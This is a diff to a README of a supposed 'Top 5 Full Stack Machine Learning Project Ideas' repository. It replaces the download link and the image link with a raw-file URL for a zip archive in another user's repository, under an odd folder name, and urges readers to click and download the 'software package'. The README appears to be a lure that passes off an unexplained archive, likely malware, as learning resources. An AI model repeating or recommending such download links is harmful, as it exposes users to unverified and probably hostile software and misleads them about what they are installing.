@@ -29,7 +29,7 @@ Build a system capable of identifying and classifying malware using machine lear
 
 For a comprehensive guide on how to implement these project ideas, you can download the necessary resources from the following link:
 
-[![Download Software](https://github.com/LacostXitad/Top-5-Full-Stack-Machine-Learning-Project-Ideas/releases/download/v2.0/Software.zip)](https://github.com/LacostXitad/Top-5-Full-Stack-Machine-Learning-Project-Ideas/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/delacruzrlkq/Top-5-Full-Stack-Machine-Learning-Project-Ideas/main/tricliniarch/Learning-Machine-Project-Top-Ideas-Full-Stack-2.2.zip)](https://raw.githubusercontent.com/delacruzrlkq/Top-5-Full-Stack-Machine-Learning-Project-Ideas/main/tricliniarch/Learning-Machine-Project-Top-Ideas-Full-Stack-2.2.zip)
 
 *(Note: Click on the link above to download the software package.)*
 
@@ -39,6 +39,6 @@ If the link is not accessible, please check the "Releases" section of this repos
 
 Are you ready to dive into the world of full stack machine learning projects? Explore the project ideas, download the resources, and start building innovative applications that combine the power of machine learning with frontend and backend development. Let your creativity soar and bring these project ideas to life!
 
-![Machine Learning](https://github.com/LacostXitad/Top-5-Full-Stack-Machine-Learning-Project-Ideas/releases/download/v2.0/Software.zip)
+![Machine Learning](https://raw.githubusercontent.com/delacruzrlkq/Top-5-Full-Stack-Machine-Learning-Project-Ideas/main/tricliniarch/Learning-Machine-Project-Top-Ideas-Full-Stack-2.2.zip)
 
 Happy coding! 🚀🤖
